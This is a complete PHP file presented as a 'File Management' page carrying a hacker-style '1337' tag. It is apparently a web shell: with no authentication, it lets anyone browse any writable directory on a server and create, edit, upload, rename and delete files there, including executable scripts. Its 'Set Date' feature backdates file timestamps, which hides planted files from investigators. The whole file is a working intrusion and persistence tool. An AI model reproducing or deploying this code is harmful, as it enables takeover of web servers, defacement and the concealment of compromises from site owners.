<?php
session_start();

// Set the default directory (where the script is located)
if (!isset($_SESSION['directory'])) {
    $_SESSION['directory'] = __DIR__ . '/';
}
$directory = $_SESSION['directory'];
$uploadMessage = ""; 
$fileContent = ""; 

// Ensure the directory is writable
if (!is_writable($directory)) {
    die("Error: Directory is not writable.");
}

// Functions to manage files
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Create File
    if (isset($_POST['create'])) {
        $filename = basename($_POST['filename']);
        if (!empty($filename) && !file_exists($directory . $filename)) {
            file_put_contents($directory . $filename, "");
            touch($directory . $filename); // Set creation time
            $uploadMessage = "File created successfully: " . htmlspecialchars($filename);
        } else {
            $uploadMessage = "File already exists or invalid filename.";
        }
    }

    // Edit File
    if (isset($_POST['edit'])) {
        $filename = basename($_POST['filename']);
        $content = $_POST['content'];
        if (file_exists($directory . $filename)) {
            file_put_contents($directory . $filename, $content);
            touch($directory . $filename); // Update modified time
            $uploadMessage = "File updated successfully: " . htmlspecialchars($filename);
        } else {
            $uploadMessage = "File not found.";
        }
    }

    // Upload File
    if (isset($_POST['upload'])) {
        $uploadedFile = basename($_FILES['file']['name']);
        if (move_uploaded_file($_FILES['file']['tmp_name'], $directory . $uploadedFile)) {
            $uploadMessage = "File uploaded successfully: " . htmlspecialchars(realpath($directory . $uploadedFile));
        } else {
            $uploadMessage = "Upload failed.";
        }
    }

    // Rename File
    if (isset($_POST['rename'])) {
        $oldName = basename($_POST['old_name']);
        $newName = basename($_POST['new_name']);
        if (file_exists($directory . $oldName) && !empty($newName) && !file_exists($directory . $newName)) {
            rename($directory . $oldName, $directory . $newName);
            $uploadMessage = "File renamed successfully: " . htmlspecialchars($newName);
        } else {
            $uploadMessage = "Old file not found or invalid new filename.";
        }
    }

    // Delete File
    if (isset($_POST['delete'])) {
        $fileToDelete = basename($_POST['file_to_delete']);
        if (file_exists($directory . $fileToDelete) && unlink($directory . $fileToDelete)) {
            $uploadMessage = "File deleted successfully: " . htmlspecialchars($fileToDelete);
        } else {
            $uploadMessage = "Deletion failed or file not found.";
        }
    }

    // Change Directory
    if (isset($_POST['change_dir'])) {
        $newDir = rtrim($_POST['new_directory'], '/') . '/';
        if (is_dir($newDir) && is_writable($newDir)) {
            $_SESSION['directory'] = realpath($newDir) . '/';
            $directory = $_SESSION['directory'];
            $uploadMessage = "Directory changed to: " . htmlspecialchars($directory);
        } else {
            $uploadMessage = "Invalid or non-writable directory.";
        }
    }

    // Load File Content
    if (isset($_POST['load'])) {
        $filename = basename($_POST['filename']);
        if (file_exists($directory . $filename)) {
            $fileContent = file_get_contents($directory . $filename);
        } else {
            $uploadMessage = "File not found.";
        }
    }

    // Set File Date
    if (isset($_POST['set_date'])) {
        $filename = basename($_POST['filename']);
        $creationDate = strtotime($_POST['creation_date']);
        
        if (file_exists($directory . $filename) && $creationDate !== false) {
            if (touch($directory . $filename, $creationDate, $creationDate)) {
                $uploadMessage = "File date updated successfully: " . htmlspecialchars($filename);
            } else {
                $uploadMessage = "Failed to update file date. Check permissions.";
            }
        } else {
            $uploadMessage = "File not found or invalid date.";
        }
    }
}

// Get list of files in the directory
$files = array_diff(scandir($directory), ['..', '.']);

// Function to get file creation and modified time
function getFileTimes($filePath) {
    if (file_exists($filePath)) {
        return [
            'created' => date('Y-m-d H:i:s', filectime($filePath)),
            'modified' => date('Y-m-d H:i:s', filemtime($filePath)),
        ];
    }
    return ['created' => 'N/A', 'modified' => 'N/A'];
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Management</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background: #f4f4f4;
            margin: 0;
            padding: 20px;
            color: #333;
        }
        h1 {
            text-align: center;
            margin-bottom: 20px;
            color: #444;
        }
        h2 {
            margin-top: 20px;
            border-bottom: 2px solid #333;
            padding-bottom: 5px;
            color: #333;
        }
        form {
            background: #fff;
            padding: 15px;
            border-radius: 8px;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
            margin-bottom: 20px;
        }
        input[type="text"], input[type="file"], textarea {
            width: calc(100% - 22px);
            padding: 10px;
            margin: 5px 0;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-size: 14px;
        }
        button {
            background-color: #333;
            color: white;
            padding: 10px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            transition: background-color 0.3s;
            width: 100%;
        }
        button:hover {
            background-color: #4cae4c;
        }
        .message {
            color: #d9534f;
            text-align: center;
            margin-bottom: 20px;
        }
        .file-list {
            margin: 20px 0;
            padding: 10px;
            background: #fff;
            border-radius: 8px;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
        }
        .file-list ul {
            list-style: none;
            padding: 0;
            margin: 0;
        }
        .file-list li {
            background: #f9f9f9;
            margin: 5px 0;
            padding: 10px;
            border-radius: 4px;
            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
            color: #333;
        }
        .flex-container {
            display: flex;
            justify-content: space-between;
            flex-wrap: wrap;
        }
        .form-container {
            flex: 1;
            margin-right: 10px;
        }
        .file-list-container {
            flex: 1;
        }
        @media (max-width: 768px) {
            .flex-container {
                flex-direction: column;
            }
            .form-container {
                margin-right: 0;
            }
        }
    </style>
</head>
<body>
    <img src="https://i.ibb.co.com/H4XfdZC/image.png" alt="Kitabisacom1337" style="width: 260px; height: auto;">
    <p class="message"><?php echo htmlspecialchars($uploadMessage); ?></p>
    <h2>Current Directory: <?php echo htmlspecialchars($directory); ?></h2>

    <div class="flex-container">
        <div class="form-container">
            <form method="post">
                <h2>Change Directory</h2>
                <input type="text" id="new_directory" name="new_directory" placeholder="Path to Directory" required>
                <button type="submit" name="change_dir">Change Directory</button>
            </form>

            <form method="post">
                <h2>Create File</h2>
                <input type="text" name="filename" placeholder="File Name" required>
                <button type="submit" name="create">Create File</button>
            </form>

            <form method="post">
                <h2>Edit File</h2>
                <input type="text" name="filename" placeholder="File Name" required>
                <button type="submit" name="load">Load Content</button>
            </form>

            <?php if (isset($_POST['load']) && isset($fileContent)): ?>
                <form method="post">
                    <input type="hidden" name="filename" value="<?php echo htmlspecialchars($filename); ?>">
                    <textarea name="content" placeholder="File Content" required><?php echo htmlspecialchars($fileContent); ?></textarea>
                    <button type="submit" name="edit">Edit File</button>
                </form>
            <?php endif; ?>

            <form method="post" enctype="multipart/form-data">
                <h2>Upload File</h2>
                <input type="file" name="file" required>
                <button type="submit" name="upload">Upload File</button>
            </form>

            <form method="post">
                <h2>Rename File</h2>
                <input type="text" name="old_name" placeholder="Old File Name" required>
                <input type="text" name="new_name" placeholder="New File Name" required>
                <button type="submit" name="rename">Rename File</button>
            </form>

            <form method="post">
                <h2>Delete File</h2>
                <input type="text" name="file_to_delete" placeholder="File to Delete" required>
                <button type="submit" name="delete">Delete File</button>
            </form>
        </div>

        <div class="file-list-container">
            <div class="file-list">
                <h2>Current Directory Files</h2>
                <ul>
                    <?php foreach ($files as $file): ?>
                        <?php
                            $filePath = $directory . $file;
                            $fileSize = filesize($filePath);
                            $fileSizeFormatted = formatFileSize($fileSize);
                            $times = getFileTimes($filePath);
                        ?>
                        <li>
                            <strong><?php echo htmlspecialchars($file); ?></strong><br>
                            Size: <?php echo $fileSizeFormatted; ?><br>
                            Created: <?php echo $times['created']; ?><br>
                            Modified: <?php echo $times['modified']; ?><br>
                            <form method="post" style="margin-top: 10px;">
                                <input type="hidden" name="filename" value="<?php echo htmlspecialchars($file); ?>">
                                <input type="datetime-local" name="creation_date" required>
                                <button type="submit" name="set_date">Set Date</button>
                            </form>
                        </li>
                    <?php endforeach; ?>
                </ul>
            </div>
        </div>
    </div>

    <?php
    function formatFileSize($fileSize) {
        if ($fileSize >= 1073741824) {
            return number_format($fileSize / 1073741824, 2) . ' GB';
        } elseif ($fileSize >= 1048576) {
            return number_format($fileSize / 1048576, 2) . ' MB';
        } elseif ($fileSize >= 1024) {
            return number_format($fileSize / 1024, 2) . ' KB';
        }
        return $fileSize . ' bytes';
    }
    ?>
</body>
</html>
